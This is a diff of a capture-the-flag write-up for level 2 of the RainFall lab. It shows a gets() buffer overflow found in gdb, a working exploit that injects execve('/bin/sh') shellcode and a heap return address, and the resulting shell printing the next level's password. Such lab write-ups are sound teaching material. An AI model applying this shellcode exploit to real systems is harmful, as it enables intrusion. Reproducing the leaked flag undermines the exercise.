@@ -6,16 +6,18 @@
    ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▄██▄▄▄▄▄
     ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀             ▀▀▀▀▀▀▀▀
 
-gdb level2
-disas main shows the exectuables, calls p(), then returns
-p() calls gets(), -> buffer overflow.
+level2@RainFall:~$ gdb level2
+(gdb) disas main
+-> shows that the exectuables, calls p(), then returns
+-> p() calls gets(), -> buffer overflow.
 
-We find the required input for overflow just like in level1:
+We find the required input for overflow just like in level1: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
-echo 'run < <(echo {TEST_STRING})' | gdb executables/level2
-> Program received signal SIGSEGV, Segmentation fault.
-> 0x37634136 in ?? ()
-offset: 80
+level2@RainFall:~$ echo 'run < <(echo {PATTERN})' | gdb executables/level2
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+-> offset: 80
 
 We use a shellcode specially made for gets():
 http://shell-storm.org/shellcode/files/shellcode-219.php
@@ -23,18 +25,26 @@ http://shell-storm.org/shellcode/files/shellcode-219.php
 /!\ We run into an issue /!\
 The program checks the return pointer ! (cmp    $0xb0000000,%eax)
 
-However, it calls strdup(), thus copying the shellcode to the heap at address 0x08040a08.
-This address is always the same due to the lack of ASLR.
+However, it calls strdup(), thus copying the shellcode to the heap.
+Let's find the address:
 
-################################################################################
-f=/tmp/l2
+(gdb) disas p
+(...)
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret
+(gdb) b* 0x0804853d
+(gdb) run < <(echo BBBBBBB)
+Breakpoint 1, 0x0804853d in p ()
+(gdb) x $eax
+0x804a008:      0x42424242
 
-printf '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' > $f \
-&& printf '%.0s-' {1..25} >> $f \
-&& printf '\x08\xa0\x04\x08' >> $f
+The input is stored at 0x804a008.
 
-cat $f - | ./level2
+level2@RainFall:~$ f=/tmp/l2
+level2@RainFall:~$ printf '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' > $f \
+                   && printf '%.0s-' {1..25} >> $f \
+                   && printf '\x08\xa0\x04\x08' >> $f
+level2@RainFall:~$ cat $f - | ./level2
 $ cat /home/user/level3/.pass
-################################################################################
-
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
